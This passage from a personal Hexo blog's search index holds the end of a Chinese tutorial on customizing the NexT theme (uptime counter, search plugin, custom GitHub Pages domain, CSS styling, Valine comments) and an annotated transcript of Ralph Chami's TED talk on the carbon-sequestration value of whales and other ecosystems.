operator">></span>载入天数<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span>span id<span class="token operator">=</span><span class="token string">"times"</span><span class="token operator">></span>载入时分秒<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">var</span> now <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">createtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> grt<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token string">"03/01/2023 10:00:00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此处修改你的建站时间或者网站上线时间</span>        now<span class="token punctuation">.</span><span class="token function">setTime</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        days <span class="token operator">=</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> grt <span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token operator">/</span> <span class="token number">60</span> <span class="token operator">/</span> <span class="token number">60</span> <span class="token operator">/</span> <span class="token number">24</span><span class="token punctuation">;</span> dnum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>days<span class="token punctuation">)</span><span class="token punctuation">;</span>        hours <span class="token operator">=</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> grt <span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token operator">/</span> <span class="token number">60</span> <span class="token operator">/</span> <span class="token number">60</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> dnum<span class="token punctuation">)</span><span class="token punctuation">;</span> hnum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>hours<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>hnum<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span><span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>hnum <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> hnum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> minutes <span class="token operator">=</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> grt <span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token operator">/</span><span class="token number">60</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> dnum<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> hnum<span class="token punctuation">)</span><span class="token punctuation">;</span>        mnum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>minutes<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>mnum<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span><span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>mnum <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> mnum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        seconds <span class="token operator">=</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> grt <span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> dnum<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> hnum<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> mnum<span class="token punctuation">)</span><span class="token punctuation">;</span>        snum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>snum<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span><span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>snum <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> snum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"timeDate"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"本站已安全运行 "</span><span class="token operator">+</span>dnum<span class="token operator">+</span><span class="token string">" 天 "</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"times"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> hnum <span class="token operator">+</span> <span class="token string">" 小时 "</span> <span class="token operator">+</span> mnum <span class="token operator">+</span> <span class="token string">" 分 "</span> <span class="token operator">+</span> snum <span class="token operator">+</span> <span class="token string">" 秒."</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token string">"createtime()"</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即可在网页的页脚显示网站已经运行了多长时间</p><p>效果如图下所示</p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318589.jpg"><h2 id="右上角Github图标"><a href="#右上角Github图标" class="headerlink" title="右上角Github图标"></a>右上角Github图标</h2><p>直接在主题配置文件中搜索：<code>github_banner</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"># <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Follow me on GitHub</span><span class="token template-punctuation string">`</span></span> banner <span class="token keyword">in</span> the top<span class="token operator">-</span>right corner<span class="token punctuation">.</span><span class="token literal-property property">github_banner</span><span class="token operator">:</span>  <span class="token literal-property property">enable</span><span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token literal-property property">permalink</span><span class="token operator">:</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>zhzvite  <span class="token literal-property property">title</span><span class="token operator">:</span> Follow me on GitHub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后修改内容即可。</p><p>如下图所示：</p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318597.jpg" alt="blob"><h2 id="添加搜索功能"><a href="#添加搜索功能" class="headerlink" title="添加搜索功能"></a>添加搜索功能</h2><p>打开博客的<strong>搜索文章的 功能</strong></p><p>下载<strong>搜索插件</strong>：</p><p>git bash黑窗口中输入：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">npm install hexo-generator-searchdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>主题 的 _config 配置文件中找到 <strong>local_search</strong>，下面的 <strong>enable输入true即可。</strong></li></ol><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318610.jpg" alt="blob"><ol start="2"><li>在根目录的 _config.yml 文件中 的末尾添加下面的内容：（选项的内容可以适当修改）</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text"># hexo-generator-searchdbsearch:  path: search.xml  field: post  format: html  limit: 10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li><pre><code>hexo cl &amp;&amp;hexo g &amp;&amp;hexo s<pre class="line-numbers language-none"><code class="language-none">即可看见更新如以下界面&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402071318618.jpg&quot; alt&#x3D;&quot;blob&quot;&gt;## Github域名挂载&gt; github pages域名挂载,以阿里云域名为例子,其他域名类似### 第零步去[阿里云域名网站](https:&#x2F;&#x2F;wanwang.aliyun.com&#x2F;newdomain&#x2F;1yuan?domainCartTradeParams&#x3D;dr_27906258_000&amp;_v_&#x3D;6ff4a055f2f22f9d118832696bb06df3&amp;keyword&#x3D;)买一个自己中意的域名,新人能享受1元一年服务,快剁手吧!### 第一步首先是用&#96;ping&#96;命令找到存放你的github pages的主机的IP地址，在终端里面用命令&#96;ping xxx.github.io&#96;便可完成，下图中红框内的就是我们要找的IP地址：![image-20240211133616800](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402111411944.png)记住这个ip地址### 第二步在购买域名的提供商为域名添加解析。我是在阿里云买的域名，因此我以阿里云的为例。在域名控制台选择想要绑定的域名，并点击解析：![image-20240211133754793](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402111411957.png)域名控制台然后添加如下两条记录：![image-20240211133415699](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402111411972.png)添加记录### 第三步打开命令行&#x2F;终端,切换到blog文件夹内的source目录输入以下命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>touch CNAME</code></pre></li></ol><pre class="line-numbers language-none"><code class="language-none">![image-20240211193911379](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402111941964.png)然后会生成一个叫做CNAME的文件,打开编辑,里面输入你买的域名,不用写&#96;http&#96;&#x2F;&#96;https&#96;和&#96;www&#96;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402111941981.png&quot; alt&#x3D;&quot;image-20240211193948472&quot; style&#x3D;&quot;zoom:50%;&quot; &#x2F;&gt;然后可以尝试&#96;hexo g+hexo d&#96;部署你的博客,然后等一下github更新就好了之后若是想检查域名是否挂载成功可以做如下操作:在Github中，找到托管博客的&#96;xxx.github.io&#96;项目：![image-20240211133953100](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402111411984.png)进入到设置页面，并滑动到下方，找到**Github Pages**这一栏，在**Custom Domain看域名**是否是自己填的那个：![image-20240211134156078](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;zhzvite&#x2F;picgoroom@img&#x2F;img&#x2F;202402111411994.png)到这儿就已经完成了，等待10分钟(左右)就可以使用自定义的域名访问github pages所提供的页面了。## 博客背景图片美化### 添加背景图片在blog的根目录下的source文件夹下新建_data文件夹，并且新建style.styl文件路径如下所示：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>F:\hexo\blog\source_data\styles.styl</p><pre class="line-numbers language-none"><code class="language-none">之后在Next主题配置文件中中找到：&#96;custom_file_path&#96; 取消&#96;style&#96;的注释，意味着启用这个文件。打开复制粘贴如下内容：&#96;&#96;&#96;cssbody &#123;    background:url(&#x2F;images&#x2F;background.png);    background-repeat: no-repeat;    background-attachment: fixed; &#x2F;&#x2F;是否滚动，fixed固定    background-size: cover;      &#x2F;&#x2F;填充    background-position: center;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>background: url：你的背景图片的地址，放置于<code>Next</code>主题文件下的<code>source/images/background.png</code></li><li>fixed：表示是否随鼠标滚动，选择fixed固定</li><li>size：表示填充</li><li>posi：表示位置</li></ul><h3 id="设置背景透明"><a href="#设置背景透明" class="headerlink" title="设置背景透明"></a>设置背景透明</h3><p>还是在这个<code>styles.style</code>文件里面，接着上面的内容下面直接复制粘贴：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">//文章背板的颜色rgb.main-inner > .sub-menu, .main-inner > .post-block, .main-inner > .tabs-comment, .main-inner > .comments, .main-inner > .pagination</span><span class="token punctuation">&#123;</span>    <span class="token property">background</span><span class="token punctuation">:</span> #f5f5f56b<span class="token punctuation">;</span>      //此处使用十六进制颜色代码，         也可以使用rgba进行调色，                                //实际效果为白色透明色底板              rgba的第四参数即为透明度<span class="token punctuation">&#125;</span><span class="token selector">body</span><span class="token punctuation">&#123;</span>               //修改主体字体颜色  <span class="token property">color</span><span class="token punctuation">:</span> #000<span class="token punctuation">;</span>      //纯黑<span class="token punctuation">&#125;</span><span class="token selector">.posts-expand .post-title-link</span> <span class="token punctuation">&#123;</span>    //标题颜色    <span class="token property">color</span><span class="token punctuation">:</span> #000<span class="token punctuation">;</span>                //首页文章标题颜色， （默认为灰辨识度不高）<span class="token punctuation">&#125;</span><span class="token selector">.posts-expand .post-meta-container</span> <span class="token punctuation">&#123;</span>    //标题下的日期颜色    <span class="token property">color</span><span class="token punctuation">:</span> #880000<span class="token punctuation">;</span>             //此处修改为红色，可自行调用rgb调色<span class="token punctuation">&#125;</span><span class="token selector">//侧边框的透明度设置.sidebar</span> <span class="token punctuation">&#123;</span>  <span class="token property">opacity</span><span class="token punctuation">:</span> 0.7<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">//菜单栏的调色.header-inner</span> <span class="token punctuation">&#123;</span>       <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>0.7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">//搜索框透明.popup</span> <span class="token punctuation">&#123;</span>          <span class="token property">opacity</span><span class="token punctuation">:</span> 0.5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.main-inner</span> <span class="token punctuation">&#123;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 0<span class="token punctuation">)</span><span class="token punctuation">;</span>  //主体背景透明    <span class="token property">padding</span><span class="token punctuation">:</span> 0px 40px 40px 40px<span class="token punctuation">;</span>  //调整组件位置<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中所有的内容都有注释，可以<strong>自己调节</strong></p><p>注意：0为完全透明，1为完全不透明</p><hr><h3 id="边框圆角设置"><a href="#边框圆角设置" class="headerlink" title="边框圆角设置"></a>边框圆角设置</h3><p>在 <code>style.style</code>同级文件夹下新建：<code>variables.styl</code>，并且在主题配置文件中同样取消<code>custom_file_path</code>的<code>variable</code>的注释，代表启用variable</p><p>然后打开这个文件，输入以下内容：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css">// 圆角设置$border-radius-inner     = 30px 30px 30px 30px<span class="token punctuation">;</span>$border-radius           = 30px<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中 数值表示圆角的弧度，可以自己设置</p><h2 id="添加代码复制按钮"><a href="#添加代码复制按钮" class="headerlink" title="添加代码复制按钮"></a>添加代码复制按钮</h2><p>修改主题配置文件</p><blockquote><p> 找到copy_button字段：</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Add copy button on codeblock</span></span>copy_button<span class="token operator">:</span>  enable<span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Show text copy result<span class="token punctuation">.</span></span></span>  show_result<span class="token operator">:</span> <span class="token keyword">default</span>  <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Available values<span class="token operator">:</span> <span class="token keyword">default</span> <span class="token operator">|</span> flat <span class="token operator">|</span> mac</span></span>  style<span class="token operator">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加Valine评论"><a href="#添加Valine评论" class="headerlink" title="添加Valine评论"></a>添加Valine评论</h2><p>注册<a href="https://console.leancloud.cn/">leancloud账号</a></p><p>创建开发版应用</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403262046220.png" alt="image-20240326203810380"></p><p>找到并记录APPID 和APPkey</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403262046242.png" alt="image-20240326203632922"></p><p>找到next主题中关于valine配置,修改appid和appkey，就可以使用评论功能了！</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403262046254.png" alt="image-20240326203055324"></p><p>填入appid和appkey，就可以重新部署了！</p>]]></content>
      
      
      <categories>
          
          <category> EATPOOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>worth and economy详解</title>
      <link href="/2023/12/19/TED_1/"/>
      <url>/2023/12/19/TED_1/</url>
      
        <content type="html"><![CDATA[<h2 id="What-a-living-whale-is-worth-–-and-why-the-economy-should-protect-nature"><a href="#What-a-living-whale-is-worth-–-and-why-the-economy-should-protect-nature" class="headerlink" title="What a living whale is worth – and why the economy should protect nature"></a>What a living whale is worth – and why the economy should protect nature</h2><p><strong>Ralph Chami |TED2022| April 2022</strong></p><p><a href="https://www.bilibili.com/video/BV1AC4y197vF/?spm_id_from=333.880.my_history.page.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">一条活蓝鲸值多少钱？比你想象的多得多【TED演讲】_哔哩哔哩_bilibili</a></p><p><a href="https://pic.imgdb.cn/item/658184edc458853aef58b9a7.png"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071320264.png"></a></p><p>In 2017, I confided( to tell someone you trust about personal things that you do not want other people to know) in a dear friend of mine that my lifelong wish was to see the blue whales. Before I knew it, I found myself with a bunch of researchers in the Sea of  <strong>Cortez</strong>（科尔特斯海） studying the blue whales. We used to be in a boat 25 foot long. And next to us … is this majestic（雄伟的，壮丽的） creature feeding gracefully next to us.</p><h2 id="Carbon-sequestration-of-the-whales-system"><a href="#Carbon-sequestration-of-the-whales-system" class="headerlink" title="Carbon sequestration of the whales system"></a>Carbon sequestration of the whales system</h2><p>Now you have to understand, at that point in time, I knew nothing about blue whales, or whales in general. I’m just a financial economist. But I learned something from them, which was really incredible.  It was already known in the science that whales capture so much carbon on their body and indirectly. And that’s, of course, very important for us because we are all facing the climate <strong>calamity</strong>（灾难，祸患） and we are all talking about how to grab carbon dioxide from the atmosphere. </p><p>Well, it turns out that the whales grab so much carbon dioxide from the atmosphere – by the way(顺便说, they eat and they <strong>poop</strong>(拉屎）. Yeah. It’s all about food. So how does the whale system work?</p><ol><li><h3 id="phytoplankton"><a href="#phytoplankton" class="headerlink" title="phytoplankton"></a>phytoplankton</h3><p> Well, it starts in the oceans. There’s these <strong>microscopic</strong> <strong>organisms</strong>（生物，有机体) called <strong>phytoplankton</strong>. (植物，浮游生物）Those phytoplankton do something really incredible. They grab so much carbon dioxide from the atmosphere, and they return oxygen to all of us.  Now how much carbon dioxide do they grab from the atmosphere? About 37 <strong>gigatons</strong>（十亿吨级） of carbon dioxide from the atmosphere. Truly the lungs of the planet are in the ocean. Now, if you want to visualize what 37 gigatons mean, that’s the <strong>equivalent</strong> of the carbon that is grabbed by four Amazon forests per year. That’s how much is being sucked in by these <strong>photosynthetic</strong>（光合作用） organisms. </p></li><li><h3 id="krill"><a href="#krill" class="headerlink" title="krill"></a>krill</h3><p>Now larger creatures called <strong>krill</strong>（ small shellfish）, love to eat phytoplankton directly or indirectly. And the whales love to feed on the krill. They feed so much on the krill that they grow bigger and bigger, and they store carbon in their body.  How much carbon do they store in their body? </p></li><li><h3 id="whale"><a href="#whale" class="headerlink" title="whale"></a>whale</h3><p>Roughly about seven to nine tons of carbon on their body. If you want to <strong>convert</strong>(转换) that to carbon dioxide, that’s about 33 tons of carbon dioxide being kept out of the atmosphere on the body of a single whale. If you want to visualize that, that’s the work of 1,500 trees on the body of a single whale. OK? But those guys, because they eat a lot, what do you do next? You poop a lot. And their poop turns out to be incredibly important because it fertilizes（受精，施肥[to put fertilizer on the soil to make plants grow]） the phyto(一种植物？）. So you have this wonderful cycle. OK? The whale feeds on the krill, the krill feeds on the phyto, and the phyto eats the poop of the whales to get more active. And when the phyto gets more active, it grabs more carbon dioxide from the atmosphere. So just imagine: the whales, they capture carbon on their body. Unfortunately, at some point they die, and they’re so heavy they sink to the bottom of the ocean. And anything below a thousand meters is sequestered(a sequestered place is quiet and far away from people) almost forever. And through their poop they also fertilize phyto, making phyto even more active, grabbing more carbon dioxide from the atmosphere.</p></li></ol><h2 id="The-bad-status-of-the-whales"><a href="#The-bad-status-of-the-whales" class="headerlink" title="The bad status of the whales"></a>The bad status of the whales</h2><p>So in a sense, the whales are incredible allies（同盟国） in the fight against climate change. Now that’s good news, right? Yeah.  Except that whales are dying. They’re dying from ship strikes. They’re dying from pollution, they’re dying from entanglements(纠缠，铁丝网围栏）. In fact, they’re dying because our current economic system puts a zero value on a living whale. But chop（<strong>cut some thing</strong>) a whale, sell it for its meat, it acquires a value. The value of a living whale is zero, zero dollars, zero in any currency（货币）.I’m a financial economist. And I’m listening to these scientists bemoaning(<strong>complain disappointed about some things</strong>) what’s happening to the whales. And I wanted to help. I didn’t know how to help. And I thought, wait a minute. Maybe I can bring your message to the audiences around the world. Maybe I can translate all of that value, those services they do for us in a language that we can all understand. </p><h2 id="translate-the-value"><a href="#translate-the-value" class="headerlink" title="translate the value"></a>translate the value</h2><p>Unfortunately, it’s a language of dollars and cents. So I set out with my team to value the services of a whale but one service – because the whales do a whole host of things. But I just wanted to value one thing, which is what is the value of their carbon sequestration(扣押) service to us? </p><p>Now how would you do something like that? After all, the whale is a living system. The whale captures carbon on her body, and she gives birth to baby whales who also grow up to capture carbon on their body. And they give birth to whales and so forth, and indirectly through the fertilization of phyto. So how would you do something like this? </p><p>Well, to do that, </p><p>I had to resort to what I do best, which is valuation. I looked at it, I said, wait a minute. This looks like a share of stock（股票） that pays dividends（红利）.Except those dividends are live dividends. They give birth to more dividends. So if I were to track the whale over her lifetime and keep track of all these dividends into the future, and then multiply that by the price of carbon, and discount（折价，折现，忽视） that all the way to the present, I can figure out what is the present value, discounted present value, of the lifetime earnings of a single whale. Would you like to know how much?</p><p>Would you like to know how much?（重复）</p><p>Audience: Yes!</p><p>RC: At least three million dollars. At least. Because I’m leaving so much out of this. But I just wanted to tell the good news that I heard on that boat. I didn’t know what to do. I was trying to help them out. But there’s more good news. Would you like to hear it?</p><p>Audience: Yes!</p><h2 id="Carbon-sequestration-of-the-other-creatures"><a href="#Carbon-sequestration-of-the-other-creatures" class="headerlink" title="Carbon sequestration of the other creatures"></a>Carbon sequestration of the other creatures</h2><ul><li><h3 id="elephants"><a href="#elephants" class="headerlink" title="elephants"></a>elephants</h3></li></ul><p>RC: Their cousins on land, the elephants in the forests of Africa, in the Congo Basin, （刚果盆地） they do the same thing. Turns out the way they walk and they eat and they poop, they increase carbon sequestration（扣押） in the trees, in the forests between seven and 14 percent. Just imagine, just by <strong>frolicking</strong>（play happily) around, they’re helping us to grab carbon dioxide from the atmosphere and fix it. So I thought, hey, maybe, maybe we can value their services too. Right? Same thing. But again, use the same model of valuation. You follow the same methodology（ the set of methods）, and you discount all of that to the present. And you ask yourself, what is the value of a single elephant’s carbon sequestration service? Would you like to know how much?</p><p>Audience: Yes!</p><p>RC: Here we go. 2.6 million dollars. Would you like to hear some more good news?</p><p>Audience: Yes!</p><ul><li><h3 id="forests"><a href="#forests" class="headerlink" title="forests"></a>forests</h3></li></ul><p>RC: Aside from forests – because we are land people, we just think of forests – go a little bit into the water. Sea grass, salt marsh（沼泽） mangroves（红树）, kelp（巨藻） forests, peat（泥炭） lands, wetlands – these are living systems that suck in so much carbon dioxide beyond your imagination, and they keep it forever in their roots as long as you leave them alone and you look after them .So … If you think these numbers are big, wait till you see what I’m about to tell you next. In sea grass alone, sea grass alone, carbon sequestration. How much do you think is the value of the global – If you look at globally the sea grass and you value their carbon sequestration service, how much you think it’s worth? You ready? 2.3 trillion dollars. That’s the size of the German stock market. </p><p>Now. What does this tell us? This tells us that a living and thriving（ a thriving company, business etc is very successful，欣欣向荣） nature is not only valuable intrinsically（本质的，内在的）, it’s also financially valuable to us. Question is, what do you do with this? So the science tells us what a wondrous Earth we are on. We can value it in dollars and cents. Question is, what are you going to do with it? Well, guess what? We can build a whole economy around a living and thriving nature, not an extractive（摘录的，片面的） view of nature, but a regenerative view of nature. And that economy –Thank you.</p><h2 id="The-way-to-build-the-economy"><a href="#The-way-to-build-the-economy" class="headerlink" title="The way to build the economy."></a>The way to build the economy.</h2><p>That economy is going to deliver for us sustainable and shared prosperity（兴隆） for all, big and small, all creatures on this planet. It does not have to be I win, you lose. It is a win-win. I’m going to show you how.From there we can build – In order to build that economy, we need three things. We need the science, the accounting, the scientific accounting. What is it that you have? How much of it do you have? Then people like me, financial economists, come around and they say, “What is the value of what you have?” The reason we value it is just to basically translate it into the language that policymakers can understand so they can make decisions. That’s all. It’s a translation. But then the third pillar is very important, which is the legal framing. The legal framing is very important because we need to protect the rights of nature, a living and thriving nature. Three things. Once you do these three things, you can create markets around nature. When I say markets around nature, not an extractive view of nature, but a regenerative view of nature. And I’m going to show you how. </p><p>I’m going to show you how. Gabon has 57,000 elephants. If you leave them alone, they can grow to 195,000 elephants. Gabon can sell the carbon offsets of its elephants. Imagine – because those elephants are grabbing carbon in the trees – they can sell the carbon offsets of their elephants. To whom? To us because we’re all enamoured（依恋的，迷恋的） with going carbon zero, carbon negative, carbon neutral（中立的）. And our money will come in to look after these elephants in perpetuity（永久的）. OK? So how much revenue（收入） can Gabon get out of it? One billion dollars a year from allowing these elephants to frolic freely, not be tied to anything, just by leaving them alone. Those elephants, by the way, they walk, they poop, just being, having babies, doing whatever they do, they help carbon sequestration in the forests.  </p><h2 id="The-nature-and-the-economy"><a href="#The-nature-and-the-economy" class="headerlink" title="The nature and the economy."></a>The nature and the economy.</h2><p>A forest without animals is dead. It’s not about flora（植物群）. It’s about flora and fauna（动物群）. It’s about nature itself. That’s what the message is. Who would buy these carbon offsets? All these companies and countries that made commitments to carbon zero, carbon negative, carbon neutral. They would buy the carbon offsets, or carbon credits if you like. The money would flow in from these ecosystem services – be it the whales, be it the elephants, be it mangrove（红树，一种热带作物）, sea grass, salt marsh – and the money goes in by contract（<strong>合同</strong>）, using block chain（区块链） technology to look after nature in perpetuity – very important – and to look after the stewards（男服务员，主管） of nature in perpetuity. And the stewards of nature are the local and the indigenous（土生土长的） population. They’re the ones who are doing the conservation（保护工作）, not you and me.</p><p>Once we do that – Notice what it is. It’s a win for nature. It’s a win for the economy. The government will make money because the government is going to get all that revenue. It will change its fiscal（财政的） stance. It will diversify its economy. It will grow in a sustainable way. It’s a win for the environment. It’s a win for all of these creatures that have suffered so much at our hands. It’s a win for this beautiful Earth of ours. As Carl Sagan once said, “The only Earth we’ll ever know. The only home we’ll ever know.” It’s a win for us. We are taking this work <strong>in Africa to Liberia（利比里亚）, Cameroon（柯麦隆）, Kenya（肯尼亚）, South Africa</strong>. We’re taking this work to <strong>the Americas, Chile（智利）, Argentina</strong>（阿根廷）. We’re doing it in the US and in the UK. Imagine, it just started with just a wish of mine to see a blue whale. Little did I know it’s going to end up with a vision of how we ought to live for tomorrow .</p><p>Thank you.</p><p>(Applause)</p>]]></content>
      
      
      <categories>
          
          <category> TED </category>
